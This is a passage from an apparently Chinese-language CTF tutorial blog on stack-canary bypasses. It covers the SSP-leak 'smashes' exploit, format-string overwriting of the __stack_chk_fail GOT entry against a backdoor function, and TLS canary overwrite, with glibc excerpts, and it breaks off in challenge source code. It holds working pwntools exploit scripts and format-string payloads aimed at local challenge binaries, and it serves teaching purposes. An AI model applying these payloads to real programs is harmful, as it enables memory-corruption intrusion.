class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find CTF</span><br><span class="line">Searching for &#x27;CTF&#x27; in: None ranges</span><br><span class="line">Found <span class="number">2</span> results, display max <span class="number">2</span> items:</span><br><span class="line">smashes : <span class="number">0x400d21</span> (<span class="string">&quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot;</span>)</span><br><span class="line">smashes : <span class="number">0x600d21</span> (<span class="string">&quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>接着找到flag的值，但是看上文中有两个值，我们直接是用<strong>0x400d21</strong>这个值</p><div class="note default modern"><p>据网上的WP说法，ELF的重映射，当可执行文件足够小的时候，他的不同区段可能会被多次映射，留个坑后面填</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./smashes&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./smashes&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">get_main_func_addr = <span class="number">0x7fffffffded8</span></span><br><span class="line">get_io_gets_func_addr = <span class="number">0x7fffffffdcc0</span></span><br><span class="line">flag_addr = <span class="number">0x400d21</span></span><br><span class="line">offset=get_main_func_addr - get_io_gets_func_addr</span><br><span class="line">print(<span class="string">&quot;[*] offset is :&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(offset)))</span><br><span class="line">payload = (<span class="string">&quot;A&quot;</span> * offset).encode() + p64(flag_addr)</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello!\nWhat&#x27;s your name?&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>可以看到最终我们输出了flag的值</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/38.png?raw=true" alt="image-20210406222753429"></p><h3 id="劫持stack-chk-fail函数"><a href="#劫持stack-chk-fail函数" class="headerlink" title="劫持stack_chk_fail函数"></a>劫持stack_chk_fail函数</h3><p>从SSP中我们可以得知Canary失败的处理逻辑会进入到 __stack_chk_failed函数，__stack_chk_failed函数是一个普通的延迟绑定函数，可以通过修改GOT表劫持这个函数。</p><h4 id="漏洞存在点"><a href="#漏洞存在点" class="headerlink" title="漏洞存在点"></a>漏洞存在点</h4><p>格式化字符串是一种很常见的漏洞，其产生根源是printf函数设计的缺陷，printf函数它并不知道自己现在的参数个数有几个，但是它的内部却有个指针用来索检格式化字符串。对于遇到特定类型%，就去执行取相应参数的值，直到索检到格式化字符串结束。如果printf语句没有带格式化字符参数的话，那么就一定存在格式化字符串漏洞。</p><h4 id="格式化字符"><a href="#格式化字符" class="headerlink" title="格式化字符"></a>格式化字符</h4><table><thead><tr><th align="left">格式字符</th><th align="center">意义</th></tr></thead><tbody><tr><td align="left">d</td><td align="center">以十进制形式输出带符号整数(正数不输出符号)</td></tr><tr><td align="left">o</td><td align="center">以八进制形式输出无符号整数(不输出前缀0)</td></tr><tr><td align="left">x</td><td align="center">以十六进制形式输出无符号整数(不输出前缀Ox)</td></tr><tr><td align="left">u</td><td align="center">以十进制形式输出无符号整数</td></tr><tr><td align="left">f</td><td align="center">以小数形式输出单、双精度实数</td></tr><tr><td align="left">e</td><td align="center">以指数形式输出单、双精度实数</td></tr><tr><td align="left">g</td><td align="center">以%f或%e中较短的输出宽度输出单、双精度实数</td></tr><tr><td align="left">c</td><td align="center">输出单个字符</td></tr><tr><td align="left">s</td><td align="center">输出字符串</td></tr><tr><td align="left">p</td><td align="center">输出指针地址，可以用来计算格式化字符的偏移</td></tr><tr><td align="left">n</td><td align="center">将%n之前已经打印的字符个数赋值给偏移处指针所指向的地址位置</td></tr></tbody></table><ul><li>%hhn 向某地址写入1字节</li><li>%hn 向某个地址写入2字节</li><li>%n 向某个地址写入4字节</li><li>%lln 向某地址写入8字节</li></ul><h4 id="漏洞的利用手段"><a href="#漏洞的利用手段" class="headerlink" title="漏洞的利用手段"></a>漏洞的利用手段</h4><ul><li><p>搞破坏，使程序崩溃。</p><p>因为%s对应的参数地址不合法的概率还是比较大的。所以直接输入无数个%s让其遇到不合法地址然后崩溃。</p></li><li><p>泄露内存</p><p>泄露栈内容：获取某个变量的值；获取某个变量对应地址的内存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">32bit：   %n$x : 返回栈上第（n+1）个参数的值</span><br><span class="line">64bit：   %n$p 或者 %n$llx (64bit) ：返回栈上第（n-5）个参数的值</span><br></pre></td></tr></table></figure><p>泄露任意地址内存：利用got表得到libc函数地址，进而获取其他libc函数地址；盲目地dump整个程序，获取有用信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">32bit：   %n$s：把栈上第n+1个参数的值作为地址，返回该地址内存的值</span><br><span class="line">64bit：   %n$s：把栈上第n-5个参数的值作为地址，返回该地址内存的值</span><br></pre></td></tr></table></figure></li><li><p>修改内存数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%***c%n$n：  把栈上第n+1个参数的值作为地址，将该地址的高32bit值改为 hex(***)</span><br><span class="line">%***c%n$hn： 把栈上第n+1个参数的值作为地址，将该地址的高16bit值改为 hex(***)</span><br><span class="line">%***c%n$hhn：把栈上第n+1个参数的值作为地址，将该地址的高8bit值改为 hex(***)</span><br><span class="line">[64bit下，（n+1）变为（n-5）即可 ]</span><br></pre></td></tr></table></figure></li></ul><h4 id="控制符-n-的利用"><a href="#控制符-n-的利用" class="headerlink" title="控制符 %n 的利用"></a>控制符 %n 的利用</h4><p>在格式化控制符中有一个 %n ，它用于把当前输出的所有数据的长度写回一个变量中去。</p><p>由于可能会造成溢出漏洞从而进程被恶意代码劫持，现如今该控制符貌似很早之前就被弃用了。<br>现在只有在 vc 6.0++ 和 linux 上还可以用。</p><p>举一个栗子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello%n\n&quot;</span>,&amp;length);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,length);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出：</span></span><br><span class="line"><span class="comment">//hello</span></span><br><span class="line"><span class="comment">//5</span></span><br></pre></td></tr></table></figure><p>该程序首先会输出 hello ，然后把字符串长度5存回 &amp;length变量里，第二次输出length变量的值即是5。</p><h5 id="任意地址写-32位"><a href="#任意地址写-32位" class="headerlink" title="任意地址写(32位)"></a>任意地址写(32位)</h5><p>32位的地址在前面，64位的地址在后面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p32(system_addr)+ <span class="string">&#x27;%012c&#x27;</span> + <span class="string">&#x27;%6$n&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><p>举个栗子方便理解</p><p>比如payload为 <code>\x8c\x97\x04\x08%2048c%5$n</code> ，那么我们就可以把<strong>0x0804978c</strong>地址里的内容修改为**0x804 **（2048+4字节）</p></li><li><p>再举个栗子</p><p>例如要把printf的地址 修改为 system地址。我们采取单字节的修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printf_got=<span class="number">0x08049778</span>  </span><br><span class="line">system_plt=<span class="number">0x08048320</span></span><br><span class="line">payload=p32(printf_got)+p32(printf_got+<span class="number">1</span>)+p32(printf_got+<span class="number">2</span>)+p32(printf_got+<span class="number">3</span>)</span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x20</span>-<span class="number">16</span>)+<span class="string">&quot;c%5$hhn&quot;</span>  </span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x83</span>-<span class="number">0x20</span>)+<span class="string">&quot;c%6$hhn&quot;</span></span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x104</span>-<span class="number">0x83</span>)+<span class="string">&quot;c%7$hhn&quot;</span></span><br><span class="line">payload+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x08</span>-<span class="number">0x04</span>)+<span class="string">&quot;c%8$hhn&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="任意地址写-64位"><a href="#任意地址写-64位" class="headerlink" title="任意地址写(64位)"></a>任意地址写(64位)</h5><p>下面题目的EXP，我们采取2字节的修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%64c%9$hn%1510c%10$hnAAA&quot;</span> + p64(stack_chk_fail+<span class="number">2</span>) + p64(stack_chk_fail)</span><br></pre></td></tr></table></figure><p>具体解释看题解内容即可</p><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><p><a href="http://www.int0x80.top/BypassCanary/r2t4">题目地址</a>    <a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/r2t4">备用地址</a></p><p>从IDA中可以看到main函数有Canary保护</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/39.png?raw=true" alt="image-20210409000213211"></p><p>并且函数中有格式化字符串漏洞</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在后门函数backdoor</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  v0 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们看下格式化字符的偏移，运行程序输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br></pre></td></tr></table></figure><p>可以看到输出内容，我们的41414141在第六个参数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ./r2t4 </span><br><span class="line">AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">AAAA0x7ffeaa5d0250<span class="number">.0</span>x38<span class="number">.0</span>x7fa6a53fe320<span class="number">.0</span>x400730<span class="number">.0</span>x7fa6a56e1af0<span class="number">.0</span>x252e702541414141<span class="number">.0</span>x2e70252e70252e70<span class="number">.0</span>x70252e70252e7025<span class="number">.0</span>x252e70252e70252e<span class="number">.0</span>x2e70252e70252e70<span class="number">.0</span>x87ab0a70252e7025<span class="number">.0</span>x4006c0<span class="number">.0</span>x7fa6a5327840<span class="number">.0</span>x1</span><br><span class="line">*** <span class="built_in">stack</span> smashing detected ***: ./r2t4 terminated</span><br><span class="line">���@Aborted (core dumped)</span><br></pre></td></tr></table></figure><p>接着从IDA中找到后门函数的地址，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Function name| Segment |      Start      | Length  |</span><br><span class="line">  backdoor     .text  0000000000400626  00000038</span><br></pre></td></tr></table></figure><p>那我们可以直接写EXP了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./r2t4&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./r2t4&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system=<span class="number">0x400626</span></span><br><span class="line">__stack_chk_fail=elf.got[<span class="string">&quot;__stack_chk_fail&quot;</span>]</span><br><span class="line">print(<span class="string">&quot;[*] __stack_chk_fail is :&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(__stack_chk_fail)))</span><br><span class="line">print(<span class="string">&quot;[*] __stack_chk_fail high is :&quot;</span>+<span class="built_in">str</span>(p64(__stack_chk_fail+<span class="number">2</span>)))</span><br><span class="line">print(<span class="string">&quot;[*] __stack_chk_fail low is :&quot;</span>+<span class="built_in">str</span>(p64(__stack_chk_fail)))</span><br><span class="line">payload=<span class="string">b&#x27;%64c%9$hn%1510c%10$hnAAA&#x27;</span> + p64(__stack_chk_fail+<span class="number">2</span>) + p64(__stack_chk_fail)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>backdoor的地址是0x400626，利用格式化字符串漏洞把 __stack_chk_fail 的地址覆盖掉<br><code>%64c</code>：0x40，替换backdoor的两位高字节0x0040<br><code>%64c%9$hn%1510c%10$hnAAA</code>：占24个字符，24/8=3，偏移为6+3=9（之前算出的第六个参数中）<br><code>$hn</code>：向某个地址写入双字节<br><code>%1510c</code>：1510+64=0x0626,替换backdoor的两位高字节0x0626<br><code>AAA</code>：是填充字符，填充到8的倍数<br><code>__stack_chk_fail+2</code>和<code>__stack_chk_fail</code>分别替换成backdoor的高两位字节和低两位字节</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/40.png?raw=true" alt="image-20210409035655552"></p><p>输出了我们之前做题写的flag文件内容</p><h3 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h3><h4 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h4><p>通常在C程序中常存在全局变量、静态变量以及局部变量，对于局部变量来说，并不存在线程安全问题。而对于全局变量和函数内定义的静态变量，同一进程中各个线程都可以访问它们，因此它们存在多线程读写问题。</p><p>如果需要在一个线程内部的各个函数调用都能访问、但其它线程不能访问的变量（被称为static memory local to a thread 线程局部静态变量），就需要新的机制来实现，这就是TLS。当函数在不同的线程上被调用时，该线程会被分配新的栈，并且Canary会被放置在TLS上。TLS位于栈的顶部，当溢出长度较大时，可以同时覆盖返回地址前的 Canary 和 TLS 中的 Canary 实现绕过。</p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/41.png?raw=true" alt="1" style="zoom:50%;" /><h4 id="Glibc中设置Canary的过程"><a href="#Glibc中设置Canary的过程" class="headerlink" title="Glibc中设置Canary的过程"></a>Glibc中设置Canary的过程</h4><p>从glibc源码中可以看到，定义了<code>THREAD_SET_STACK_GUARD</code>时，Canary通过这个宏被设置；否则存入全局变量<code>__stack_chk_guard</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* Set up the stack checker&#x27;s canary.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> THREAD_SET_STACK_GUARD</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  __stack_chk_guard = stack_chk_guard;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>进一步查看<code>THREAD_SET_STACK_GUARD</code>定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line">    THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><p>查看<code>THREAD_SETMEM</code>，可以看到这个宏通过内联汇编，将<code>vlaue</code>，也就是Canary放入了fs寄存器的某个偏移处，而这个偏移处又是通过<code>offsetof</code>宏得到的<code>pthread</code>结构体某个成员的偏移，在上面的代码中，可以看到传入的是成员<code>header.stack_guard</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> THREAD_SETMEM(descr, member, value) </span></span><br><span class="line">  (&#123; <span class="keyword">if</span> (<span class="keyword">sizeof</span> (descr-&gt;member) == <span class="number">1</span>)      </span><br><span class="line">       <span class="keyword">asm</span> <span class="keyword">volatile</span> (<span class="string">&quot;movb %b0,%%fs:%P1&quot;</span> :      </span><br><span class="line">     : <span class="string">&quot;iq&quot;</span> (value),      </span><br><span class="line">       <span class="string">&quot;i&quot;</span> (offsetof (struct pthread, member)));      </span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">sizeof</span> (descr-&gt;member) == <span class="number">4</span>)      </span><br><span class="line">       <span class="keyword">asm</span> <span class="keyword">volatile</span> (<span class="string">&quot;movl %0,%%fs:%P1&quot;</span> :      </span><br><span class="line">     : IMM_MODE (value),      </span><br><span class="line">       <span class="string">&quot;i&quot;</span> (offsetof (struct pthread, member)));      </span><br><span class="line">     <span class="keyword">else</span>      </span><br><span class="line">       &#123;      </span><br><span class="line"> <span class="keyword">if</span> (<span class="keyword">sizeof</span> (descr-&gt;member) != <span class="number">8</span>)      </span><br><span class="line">   <span class="comment">/* There should not be any value with a size other than 1,    </span></span><br><span class="line"><span class="comment">      4 or 8.  */</span>      </span><br><span class="line">   <span class="built_in">abort</span> ();      </span><br><span class="line">      </span><br><span class="line"> <span class="keyword">asm</span> <span class="keyword">volatile</span> (<span class="string">&quot;movq %q0,%%fs:%P1&quot;</span> :      </span><br><span class="line">       : IMM_MODE ((<span class="keyword">uint64_t</span>) cast_to_integer (value)),      </span><br><span class="line"> <span class="string">&quot;i&quot;</span> (offsetof (struct pthread, member)));      </span><br><span class="line">       &#125;&#125;)</span><br></pre></td></tr></table></figure><p><code>pthread</code>是一个超大的结构体，这里略去余下部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pthread</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !TLS_DTV_AT_TP</span></span><br><span class="line">    <span class="comment">/* This overlaps the TCB as used for TLS without threads (see tls.h).  */</span></span><br><span class="line">    <span class="keyword">tcbhead_t</span> header;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Canary正是存储在<code>tcbhead_t</code>中的<code>stack_guard</code>，根据变量类型可以计算出在32位和64位上的偏移：</p><p>32位 gs:0x14 （0x4×3+0x4×3+0x4）</p><p>64位 fs:0x28（0x8×3+0x4×3+0x8）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">int</span> gscope_flag;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> feature_1;</span><br><span class="line">  <span class="keyword">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="keyword">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="keyword">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p><a href="https://github.com/sixstars/starctf2018/blob/master/pwn-babystack/bs.c">题目地址</a> <a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/libc-2.23.so">libc-2.23.so下载</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//babystack.c</span></span><br><span class="line"><span class="comment">//gcc -fstack-protector-strong -s -pthread babystack.c -o babystack -Wl,-z,now,-z,relro</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 